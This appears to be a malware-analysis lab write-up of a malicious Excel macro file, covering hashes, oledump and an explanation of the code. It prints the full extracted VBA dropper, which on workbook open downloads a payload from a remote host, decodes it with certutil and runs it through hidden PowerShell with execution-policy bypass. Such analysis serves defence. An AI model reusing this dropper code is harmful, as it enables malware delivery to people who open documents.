## File Hash & VT Analysis

16e6489b81a41f0bfc2bc9bb0165b624c51ed4fecf6438c73a5ee6501caf34dc *sheetsForFinancial.xlsm

4dda84ea2e71997f864666220b031dd6 *sheetsForFinancial.xlsm

VT Analysis: 28/64 Infected

## Basic Static Analysis

### Strings & floss output

This excel macro didn't gave the interesting strings outright

We will have to unzip the file to find interesting things inside it.
![1a2f12cdaa70b347f28f3f64b476a487.png](:/4da8b7d771384dd2a544e7bb65550ef1)

Here the xl/vbaProject.bin looks interesting since the payloads used in the macro malware are written in vba script. So maybe the payload is in the bin file.

![89e991016a42fb5905a11a5768269518.png](:/f9c0c61be8b14713a588de78a648cfaa)

Looks like it contains the raw bytes of the payload used. If we string grab the binary we find PowerShell command.

![31c607e7d0a766c947bcbd648874311c.png](:/af001ca3ef9d44888507ffd824e66b28)

### OleDump 

Dumping the data streams from the excel macro with oledump
![ef18bdce5c17f509a953b0577fd2a5bc.png](:/0d9d0d1bdbc547eb8f66f7cec190e2bd)

The stream 3 looks interesting, the capital M marking means the stream contains the actual macro. Lets dump that stream with ole.

![7c4c0a56754580f0983236f721e5c3c6.png](:/b1268a61641f4ae28619b60c436bb8bb)
![da74c7ad40062a758b0e88d100715ce4.png](:/3768f54a5c5d433ea615106bfdd064d5)

We can also use oledump to reconstruct the actual payload to know what kind of payload was used by the macro.

![fb4e50180545daa75f7623ee74831150.png](:/2c38e28dc2fb48ebbc733a98658bbdac)

```
Attribute VB_Name = "Module1"
Function genStr(Length As Integer)
Dim chars As Variant
Dim x As Long
Dim str As String

  If Length < 1 Then
    Exit Function
  End If

chars = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", _
  "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", _
  "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "!", "@", _
  "#", "$", "%", "^", "&", "*", "A", "B", "C", "D", "E", "F", "G", "H", _
  "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", _
  "W", "X", "Y", "Z")
  For x = 1 To Length
    Randomize
    str = str & chars(Int((UBound(chars) - LBound(chars) + 1) * Rnd + LBound(chars)))
  Next x
  
  randStr = str

End Function
        Sub Workbook_Open()
            Dim str1: genStr (17)
            Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
            str2 = "wgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZWFzLiBEbyB5b3UgbmVlZCBhIG1hbmFnZXI/CgpNdXN0IGdvIGZhc3Rlci4uLiBnbywgZ28sIGdvLCBnbywgZ28hIFRoaXMgdGhpbmcgY29tZXMgZnVsbHkgbG9hZGVkLiBBTS9GTSByYWRpbywgcmVjbGluaW5nIGJ1Y2tldC"
            Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
            str3 = "WQgd2l0aCB0aGUgZmF0IGxhZHkhIERyaXZlIHVzIG91dCBvZiBoZXJlISBGb3JnZXQgdGhlIGZhdCBsYWR5ISBZb3UncmUgb2JzZXNzZWQg"
            xHttp.Open "GET", "http://srv3.wonderballfinancial.local/abc123.crt", False
            xHttp.Send
            Dim str9: genStr (10)
            With bStrm
            .Type = 1 '//binary
            .Open
            .write xHttp.responseBody
            .savetofile "encd.crt", 2 '//overwrite
            End With
            str5 = "WQgd2l0aCB0aGUgZmF0IGxhZHkhIERyaXZlIHVzIG91dCBvZiBoZXJlISBGb3JnZXQgdGhlIGZhdCBsYWR5ISBZb3UncmUgb2JzZXNzZWQg"
            str6 = "Z2V0IG15IGVzcHJlc3NvIG1hY2hpbmU/IEp1c3QgbXkgbHVjaywgbm8gaWNlLiBZb3UncmUgYSB2ZXJ5IHRhbGVudGVkIHlvdW5nIG1hbiwgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZWZ2V0IG15IGVzcHJlc3NvIG1hY2hpbmU/IEp1c3QgbXkgbHVjaywgbm8gaWNlLiBZb3UncmUgYSB2ZXJ5IHRhbGVudGVkIHlvdW5nIG1hbiwgd2l0aCB5b3VyIG93biBjbGV2ZXIgdGhvdWdodHMgYW5kIGlkZW"
            Shell ("cmd /c certutil -decode encd.crt run.ps1 & c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -W Hidden .\run.ps1")
        End Sub
```

Going through the code I got an idea what it is actually doing. 
* It trying to call a host http://srv3.wonderballfinancial.local/abc123.crt and trying to download the exploit code on the disk in base64 format. 
* It using certutil to decode the exploit code and saving it as PowerShell script.
* It is using the 32 bit PowerShell to bypass the AMSI while running the PowerShell.
* Looks like it is some kind of remote access trojan.
